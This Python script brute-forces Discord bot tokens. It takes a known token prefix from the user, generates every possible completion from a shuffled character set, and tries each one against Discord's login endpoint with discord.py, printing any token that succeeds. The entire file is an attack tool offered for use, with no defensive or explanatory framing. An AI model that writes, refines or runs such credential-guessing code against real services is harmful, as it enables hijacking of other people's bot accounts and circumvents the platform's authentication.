HOWLONGATOKENIS = 59
CurrentToken = input("Enter your token: ")
guessLength = HOWLONGATOKENIS - len(CurrentToken)
possibleChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890._"
totalCombos = len(possibleChars) ** guessLength
print("Total possible combinations: " + str(totalCombos))
input("Press enter to continue...")


# generate combination from iteration number
def generateCombos(guessLength, iteration):
    combos = []
    for i in range(guessLength):
        combos.append(possibleChars[iteration % len(possibleChars)])
        iteration = iteration // len(possibleChars)
    return "".join(combos)


import discord
from tqdm import tqdm
import asyncio
import random

possibleChars = list(possibleChars)
random.shuffle(possibleChars)
possibleChars = "".join(possibleChars)


async def goooooooo():
    for i in tqdm(range(totalCombos)):
        combos = generateCombos(guessLength, i)
        combos = CurrentToken + combos
        client = discord.Client()
        try:
            data = await client.http.static_login(combos.strip(), bot=True)
            print(combos)
            print(data)
            print("\n")
            break
        except Exception as e:
            pass
        asyncio.get_event_loop().create_task(client.close())


asyncio.get_event_loop().run_until_complete(goooooooo())
